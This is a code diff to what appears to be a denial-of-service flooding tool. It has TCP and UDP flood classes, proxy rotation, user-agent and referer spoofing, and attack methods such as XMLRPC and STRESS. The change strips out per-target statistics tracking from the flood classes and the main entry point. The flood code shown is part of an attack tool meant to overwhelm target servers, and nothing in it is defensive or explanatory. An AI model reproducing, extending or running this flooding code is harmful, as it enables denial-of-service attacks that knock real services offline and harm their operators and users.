@@ -22,7 +22,6 @@ from yarl import URL
 from . import proxy_proto
 from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
 from .proxies import NoProxySet, ProxySet
-from .targets import TargetStats
 from .vendor.referers import REFERERS
 from .vendor.rotate import params as rotate_params, suffix as rotate_suffix
 from .vendor.useragents import USERAGENTS
@@ -173,14 +172,12 @@ class AsyncTcpFlood:
         addr: str,
         method: str,
         proxies: ProxySet,
-        stats: TargetStats,
         loop,
         settings: AttackSettings
     ) -> None:
         self._target = target
         self._addr = addr
         self._raw_target = (self._addr, (self._target.port or 80))
-        self._stats = stats
         self._proxies = proxies
         self._req_type = (
             "POST" if method.upper() in {"POST", "XMLRPC", "STRESS"}
@@ -193,10 +190,6 @@ class AsyncTcpFlood:
 
         self._loop = loop
         self._settings = settings
-
-    @property
-    def stats(self) -> TargetStats:
-        return self._stats
 
     @property
     def desc(self) -> Tuple[str, int, str]:
@@ -276,7 +269,6 @@ class AsyncTcpFlood:
             FloodIO,
             self._loop,
             on_close,
-            self._stats,
             self._settings,
             FloodSpec.from_any(payload_type, payload, self._settings.requests_per_connection),
             on_connect=on_connect,
@@ -436,7 +428,6 @@ class AsyncTcpFlood:
                 async with s.get(self._target.human_repr()) as response:
                     if on_connect and not on_connect.done():
                         on_connect.set_result(True)
-                    self._stats.track(1, request_info_size(response.request_info))
                     packets_sent += 1
                     # XXX: we need to track in/out traffic separately
                     async with async_timeout.timeout(self._settings.http_response_timeout_seconds):
@@ -592,7 +583,6 @@ class AsyncTcpFlood:
             TrexIO,
             trex_ctx,
             self._settings.requests_per_connection,
-            self._stats,
             self._loop,
             on_connect,
             on_close
@@ -652,22 +642,16 @@ class AsyncUdpFlood:
         target: Tuple[str, int],
         method: str,
         proxies: ProxySet,
-        stats: TargetStats,
         loop,
         settings: AttackSettings,
     ):
         self._target = target
-        self._stats = stats
         self._proxies = proxies
         self._loop = loop
         self._settings = settings
 
         self._method = method
         self.SENT_FLOOD = getattr(self, method)
-
-    @property
-    def stats(self) -> TargetStats:
-        return self._stats
 
     @property
     def desc(self) -> Tuple[str, int, str]:
@@ -682,7 +666,7 @@ class AsyncUdpFlood:
         transport = None
         async with async_timeout.timeout(self._settings.connect_timeout_seconds):
             transport, _ = await self._loop.create_datagram_endpoint(
-                partial(DatagramFloodIO, self._loop, self._stats, packet_gen, on_close),
+                partial(DatagramFloodIO, self._loop, packet_gen, on_close),
                 remote_addr=self._target
             )
         try:
@@ -724,7 +708,7 @@ class AsyncUdpFlood:
         return await self._generic_flood(lambda: (packet, packet_size))
 
 
-def main(url, ip, method, proxies, stats, loop=None, settings=None):
+def main(url, ip, method, proxies, loop=None, settings=None):
     if method not in Methods.ALL_METHODS:
         raise RuntimeError(f"Method {method} Not Found")
 
@@ -735,7 +719,6 @@ def main(url, ip, method, proxies, stats, loop=None, settings=None):
             ip,
             method,
             proxies,
-            stats,
             loop=loop,
             settings=settings,
         )
@@ -745,7 +728,6 @@ def main(url, ip, method, proxies, stats, loop=None, settings=None):
             (ip, url.port),
             method,
             proxies,
-            stats,
             loop=loop,
             settings=settings
         )
